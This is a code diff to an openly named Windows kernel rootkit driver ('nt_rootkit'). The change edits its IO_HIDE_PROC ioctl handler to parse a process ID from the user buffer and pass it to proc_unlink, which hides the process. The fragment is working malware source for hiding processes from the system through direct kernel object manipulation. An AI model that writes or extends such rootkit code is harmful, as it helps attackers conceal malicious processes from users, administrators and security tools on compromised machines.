@@ -4,6 +4,7 @@
  * Description: Implements IRP and driver object controls.
  */
 
+#include <ntddk.h>
 #include "ioctl.h"
 
 NTSTATUS nt_rootkit_create_close(PDEVICE_OBJECT dev_obj, PIRP irp)
@@ -41,7 +42,10 @@ NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp)
         case IO_HIDE_PROC:
                 DbgPrint(DRIVER_PREFIX "recieved %s",
                          (CHAR*)irp->AssociatedIrp.SystemBuffer);
-                proc_unlink((PUINT32)irp->AssociatedIrp.SystemBuffer);
+                ULONG pid;
+                RtlCharToInteger(
+                        irp->AssociatedIrp.SystemBuffer, 10, &pid);
+                proc_unlink(pid);
                 response = "nt_rootkit: process hidden";
                 break;
         case IO_PID_PROC:
